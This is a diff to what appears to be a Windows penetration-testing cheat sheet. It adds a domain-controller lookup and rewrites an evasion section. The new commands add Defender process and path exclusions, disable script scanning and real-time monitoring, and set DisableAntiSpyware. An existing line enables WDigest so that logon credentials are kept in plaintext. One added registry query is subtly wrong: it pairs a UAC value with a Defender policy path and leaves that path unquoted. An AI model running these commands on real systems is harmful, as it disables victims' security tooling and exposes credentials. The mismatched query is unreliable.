@@ -106,6 +106,7 @@ whoami
 whoami /groups
 whoami /priv
 systeminfo                                        Hostname, OS name and version, domain, and hot fixes
+echo %logonserver%                                Which logon server you authenticated to (Domain Controller)
 net users                                         Local users
 net localgroup administrators                     Local administrators
 net session                                       Local sessions
@@ -147,15 +148,19 @@ type <file>                                       Read a file
 
 # Evasion
 
+- Show Defender exclusions
+reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
+
 - Show AV installed
-PS C:\> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
 
-Disable Windows Defender Behavior Monitoring.
-Set the Severe Threat default action to ‘Allow’.
-Disable Realtime Monitoring.
-Exclude the ‘C:\Windows’ path from scheduled and real-time scanning.
-
-PS C:\> try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
+- Misc
+Set-MpPreference -DisableScriptScanning $True
+Set-MpPreference -DisableRealtimeMonitoring $True
+Set-MpPreference -ExclusionProcess "explorer.exe", "cmd.exe", "powershell.exe"
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v EnableLUA
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
 
 - Enabled WDigest authentication. This will store new login credentials in plaintext.
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
